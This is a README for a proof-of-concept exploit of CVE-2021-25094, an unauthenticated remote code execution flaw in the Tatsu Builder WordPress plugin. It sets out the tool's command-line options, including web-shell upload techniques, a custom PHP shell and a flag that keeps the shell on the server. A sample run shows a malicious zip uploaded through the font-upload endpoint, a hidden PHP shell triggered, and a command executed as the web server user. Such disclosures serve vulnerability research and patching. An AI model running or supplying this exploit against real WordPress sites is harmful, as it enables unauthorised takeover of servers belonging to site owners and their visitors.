# Preauth RCE in Tatsu builder Wordpress plugin (CVE-2021-25094)

Simple PoC of an unauthenticated RCE in Tatsu Builder <= 3.3.11 provided as an example.

Full write-up here: https://darkpills.com/wordpress-tatsu-builder-preauth-rce-cve-2021-25094/

Usage:
```
python3 exploit-rce.py [-h] [--technique TECHNIQUE] [--customShell CUSTOMSHELL] [--keep KEEP] [--proxy PROXY] [--compressionLevel COMPRESSIONLEVEL] url cmd

positional arguments:
  url                   Wordpress vulnerable URL (example: https://mywordpress.com/)
  cmd                   OS command to execute

optional arguments:
  -h, --help            show this help message and exit
  --technique TECHNIQUE
                        Shell technique: php | htaccess | custom
  --customShell CUSTOMSHELL
                        Provide a custom PHP shell file that will take a base64 cmd as $_POST['text'] input
  --keep KEEP           Do not auto-destruct the uploaded PHP shell
  --proxy PROXY         Specify and use an HTTP proxy (example: http://localhost:8080)
  --compressionLevel COMPRESSIONLEVEL
                        Compression level of the zip file (0 to 9, default 9)
```

Example:
```
└─$ python3 exploit-rce.py http://wordpress/ id
|=== Tatsudo: pre-auth RCE exploit for Tatsu wordpress plugin <= 3.3.11
|=== CVE-2021-25094 / Vincent MICHEL (@darkpills)

[+] Generating a zip with shell technique 'php'
[+] Uploading zip archive to http://wordpress//wp-admin/admin-ajax.php?action=add_custom_font
[+] Upload OK
[+] Trigger shell at http://wordpress/wp-content/uploads/typehub/custom/hjf/.bfzwt.php
[+] Exploit success!
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Shell file has been auto-deleted but parent directory will remain on the webserver
[+] Job done
```
